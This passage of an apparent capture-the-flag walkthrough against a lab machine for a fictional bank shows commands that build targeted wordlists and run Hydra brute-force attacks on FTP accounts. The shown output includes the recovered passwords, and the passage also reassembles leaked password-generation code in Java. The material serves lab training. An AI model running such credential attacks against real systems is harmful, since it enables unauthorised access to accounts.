</span><span class='line'><span class="mi">46</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'><span class="mi">47</span>      <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">41</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
</span><span class='line'><span class="mi">48</span>      <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">==</span><span class="mi">45</span><span class="p">)</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="p">;}</span>
</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="p">;}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using this information, we was able to crack the password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..2000}; do echo donovin$i; echo Donovin$i; echo "$i"donovin; echo "$i"Donovin; done > wl
</span><span class='line'>root@kali32:~# hydra -l sdadmin 192.168.1.20 ftp -P wl 
</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:12:57
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 8000 login tries (l:1/p:8000), ~7 tries per task
</span><span class='line'>[DATA] attacking service ftp on port 21
</span><span class='line'>[21][ftp] host: 192.168.1.20   login: sdadmin   password: donovin1998
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:13:01</span></code></pre></td></tr></table></div></figure>


<p>We log in as sdadmin / donovin1998 and repeat the process:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">sdadmin</span><span class="err">@</span><span class="nl">slax</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">mailserv_download</span><span class="o">/</span><span class="mf">2010122216451.f</span><span class="mi">81L</span><span class="n">tw4R010211</span><span class="p">.</span><span class="n">part3</span> <span class="o">|</span> <span class="n">strings</span> <span class="o">|</span> <span class="n">egrep</span> <span class="o">-</span><span class="n">o</span> <span class="s">&quot;([0-9][0-9].*)&quot;</span>
</span><span class='line'><span class="mi">32</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">loopBack</span><span class="p">(</span><span class="kt">int</span><span class="p">[]</span> <span class="n">input</span><span class="p">){</span>
</span><span class='line'><span class="mi">33</span>      <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="mi">34</span>      <span class="kt">int</span><span class="p">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="p">[</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="o">+</span><span class="n">ref</span><span class="p">];</span>
</span><span class='line'><span class="mi">35</span>      <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="mi">36</span>      <span class="nf">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="p">(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'><span class="mi">37</span>      <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">input</span><span class="p">[</span><span class="n">ch</span><span class="p">];</span> <span class="n">ch</span><span class="o">++</span><span class="p">;}</span>
</span><span class='line'><span class="mi">38</span>      <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="p">.</span><span class="n">length</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span><span class='line'><span class="mi">39</span>      <span class="k">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&lt;=</span><span class="mi">33</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">33</span><span class="o">+</span><span class="p">(</span><span class="o">++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="mi">40</span>      <span class="k">else</span> <span class="nf">if</span><span class="p">(</span><span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;=</span><span class="mi">126</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="mi">126</span><span class="o">-</span><span class="p">(</span><span class="o">--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="mi">41</span>      <span class="k">else</span><span class="p">{</span>
</span><span class='line'><span class="mi">42</span>      <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'><span class="mi">43</span>      <span class="k">else</span> <span class="n">encNew</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">+=</span><span class="p">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="p">);}}</span>
</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="p">;}</span> <span class="n">I</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sdadmin@slax:~$ cat mailserv_download/2010122015043.j15Htu1H341102 
</span><span class='line'>To: sdadmin@nosecbank.com
</span><span class='line'>CC: 
</span><span class='line'>Subject: RE: My Son's Birthday
</span><span class='line'>Date: Mon, 20 Dec 2010 15:04:32 +0500
</span><span class='line'>Return-Path: &lt;csadmin@nosecbank.com>
</span><span class='line'>Delived-To: sdadmin:nosecbank.com@nosecbank.com
</span><span class='line'>Received: (qmail 20281 invoked from network); 20 Dec 2010 10:04:32 -0000
</span><span class='line'>X-Received: from network (192.168.1.123) by mailserv3-4.us6.service.com; 
</span><span class='line'>20 Dec 2010 10:04:32 -0000
</span><span class='line'>Received: from www.nosecbank.com (unknown [198.65.139.32]) by 
</span><span class='line'>srv3.us6.service.com (Postfix) with ESMTP id D98214787FD for 
</span><span class='line'>&lt;csadmin@nosecbank.com; Mon, 20 Dec 2010 10:04:32 +0000 (GMT)
</span><span class='line'>Message-Id: &lt;2010122015043.j15Htu1H341102@www.nosecbank.com>
</span><span class='line'>Mime-Version: 1.0
</span><span class='line'>Content-Type: multipart/alternative; 
</span><span class='line'>boundary="---=_NextPart_000_0000_05F11S20.FGHZWE49"
</span><span class='line'>X-Mailer: K-Mail; Build 1.0.5510
</span><span class='line'>Thread-Index: Aa5fqAwT8nsBe3T3T5q67a3Fd22XsZ==
</span><span class='line'>Message: Hey there Paul!  I would gladly bring myself and my son over 
</span><span class='line'>tomorrow after work!  I would only be hesitant to come over if you 
</span><span class='line'>invited Fred over too... He just freaks me out sometimes.  It doesnt 
</span><span class='line'>help that he locks himself up in his office and is anti-social during 
</span><span class='line'>lunch hours... On top of that he calls himself the "databaser"!  I mean, 
</span><span class='line'>who in thier right mind does that?  Either way, I will most likely be 
</span><span class='line'>there tomorrow.  I look forward to it!   -Mark</span></code></pre></td></tr></table></div></figure>


<p>So the dbadmin&rsquo;s password could be related with the word databaser:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# for i in {1..9999}; do echo databaser$i; echo "$i"databaser; echo Databaser$i; echo "$i"Databaser; done > wl
</span><span class='line'>root@kali32:~# hydra -l dbadmin 192.168.1.20 ftp -P wl 
</span><span class='line'>Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2015-05-08 06:21:55
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 64 tasks, 39996 login tries (l:1/p:39996), ~39 tries per task
</span><span class='line'>[DATA] attacking service ftp on port 21
</span><span class='line'>[21][ftp] host: 192.168.1.20   login: dbadmin   password: databaser60
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2015-05-08 06:21:55</span></code></pre></td></tr></table></div></figure>


<p>We extract the last part of the email and put everything together:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="mi">1</span>       <span class="cm">/*input is username of account*/</span>
</span><span class='line'><span class="mi">2</span>       <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'><span class="mi">3</span>         <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'><span class="mi">4</span>         <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'><span class="mi">5</span>         <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'><span class="mi">6</span>         <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];</span>
</span><span class='line'>
</span><span class='line'><span class="mi">7</span>         <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">8</span>           <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
</span><span class='line'><span class="mi">9</span>           <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span>
</span><span class='line'><span class="mi">10</span>          <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
</span><span class='line'><span class="mi">11</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'><span class="mi">12</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'><span class="mi">13</span>          <span class="n">encArr</span><span class="o">=</span><span class="n">loopProcesS</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'><span class="mi">14</span>          <span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="mi">15</span>          <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encArr</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">16</span>            <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">==</span><span class="n">j</span><span class="o">)</span> <span class="k">break</span><span class="o">;</span>
</span><span class='line'><span class="mi">17</span>              <span class="kt">int</span> <span class="n">t</span><span class="o">=</span><span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span><span class='line'><span class="mi">18</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
</span><span class='line'><span class="mi">19</span>              <span class="n">encArr</span><span class="o">[</span><span class="n">j</span><span class="o">]=</span><span class="n">t</span><span class="o">;</span><span class="n">j</span><span class="o">--;}</span>
</span><span class='line'><span class="mi">20</span>      <span class="k">return</span> <span class="n">encArr</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'><span class="mi">21</span>      <span class="cm">/*Note the pseudocode will be implemented with the </span>
</span><span class='line'><span class="cm">22      root account and my account, we still need to implement it with the csadmin, sdadmin,   </span>
</span><span class='line'><span class="cm">23      and dbadmin accounts though*/</span>
</span><span class='line'>
</span><span class='line'><span class="mi">24</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">backLoop</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'><span class="mi">25</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'><span class="mi">26</span>        <span class="kt">int</span> <span class="n">a</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="kt">int</span> <span class="n">b</span><span class="o">=</span><span class="n">input</span><span class="o">[</span><span class="n">ref</span><span class="o">-</span><span class="mi">1</span><span class="o">];</span>
</span><span class='line'><span class="mi">27</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=(</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">)/</span><span class="mi">2</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="mi">28</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">ref</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">29</span>          <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]%</span><span class="n">check</span><span class="o">)+(</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);</span>
</span><span class='line'><span class="mi">30</span>          <span class="k">else</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+</span><span class="n">ref</span><span class="o">+</span><span class="n">i</span><span class="o">);}</span>
</span><span class='line'><span class="mi">31</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'><span class="mi">32</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopBack</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'><span class="mi">33</span>        <span class="kt">int</span> <span class="n">ref</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">/</span><span class="mi">2</span><span class="o">;</span>
</span><span class='line'><span class="mi">34</span>        <span class="kt">int</span><span class="o">[]</span> <span class="n">encNew</span> <span class="o">=</span><span class="kt">int</span><span class="o">[</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">+</span><span class="n">ref</span><span class="o">];</span>
</span><span class='line'><span class="mi">35</span>        <span class="kt">int</span> <span class="n">ch</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span>
</span><span class='line'>
</span><span class='line'><span class="mi">36</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=(</span><span class="n">ref</span><span class="o">/</span><span class="mi">2</span><span class="o">);</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'><span class="mi">37</span>          <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="n">input</span><span class="o">[</span><span class="n">ch</span><span class="o">];</span> <span class="n">ch</span><span class="o">++;}</span>
</span><span class='line'><span class="mi">38</span>          <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">encNew</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">39</span>            <span class="k">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&lt;=</span><span class="mi">33</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">33</span><span class="o">+(++</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'><span class="mi">40</span>            <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]&gt;=</span><span class="mi">126</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]=</span><span class="mi">126</span><span class="o">-(--</span><span class="n">ref</span><span class="o">*</span><span class="mi">2</span><span class="o">);</span>
</span><span class='line'><span class="mi">41</span>            <span class="k">else</span><span class="o">{</span>
</span><span class='line'><span class="mi">42</span>              <span class="k">if</span><span class="o">(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="o">)</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]-=(</span><span class="n">i</span><span class="o">%</span><span class="mi">3</span><span class="o">);</span>
</span><span class='line'><span class="mi">43</span>              <span class="k">else</span> <span class="n">encNew</span><span class="o">[</span><span class="n">i</span><span class="o">]+=(</span><span class="n">i</span><span class="o">%</span><span class="mi">2</span><span class="o">);}}</span>
</span><span class='line'><span class="mi">44</span>      <span class="k">return</span> <span class="n">encNew</span><span class="o">;}</span>
</span><span class='line'>
</span><span class='line'><span class="mi">45</span>      <span class="kt">int</span><span class="o">[]</span> <span class="nf">loopProcess</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'><span class="mi">46</span>        <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'><span class="mi">47</span>          <span class="k">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">40</span><span class="o">||</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">41</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>
</span><span class='line'><span class="mi">48</span>          <span class="k">else</span> <span class="nf">if</span><span class="o">(</span><span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]==</span><span class="mi">45</span><span class="o">)</span> <span class="n">input</span><span class="o">[</span><span class="n">i</span><span class="o">]+=</span><span class="mi">20</span><span class="o">+</span><span class="n">i</span><span class="o">;}</span>
</span><span class='line'><span class="mi">49</span>      <span class="k">return</span> <span class="n">input</span><span class="o">;}</span>
</span></code></pre></td></tr></table></div></figure>


<p>After fixing minor issues, we compile the code in Java:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">test</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>     <span class="cm">/*input is username of account*/</span>
</span><span class='line'>     <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">processLoop</span><span class="o">(</span><span class="n">String</span> <span class="n">input</span><span class="o">){</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">strL</span><span class="o">=</span><span class="n">input</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">lChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">strL</span><span class="o">-</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'>       <span class="kt">int</span> <span class="n">fChar</span><span class="o">=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
</span><span class='line'>       <span class="kt">int</span><span class="o">[]</span> <span class="n">encArr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">strL</span><span class="o">+</span><span class="mi">2</span><span class="o">];</span>
</span><span class='line'>
</span><span class='line'>       <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">&lt;</span><span class="n">strL</span><span class="o">+</span><span class="mi">1</span><span class="o">;</span><span class="n">i</span><span class="o">++){</span>
</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">i</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">input</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="o">);}</span>
</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">lChar</span><span class="o">;</span>
</span><span class='line'>         <span class="n">encArr</span><span class="o">[</span><span class="n">encArr</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="mi">1</span><span class="o">]=(</span><span class="kt">int</span><span class="o">)</span><span class="n">fChar</span><span class="o">;</span>
</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">backLoop</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
</span><span class='line'>         <span class="n">encArr</span><span class="o">=</span><span class="n">loopBack</span><span class="o">(</span><span class="n">encArr</span><span class="o">);</span>
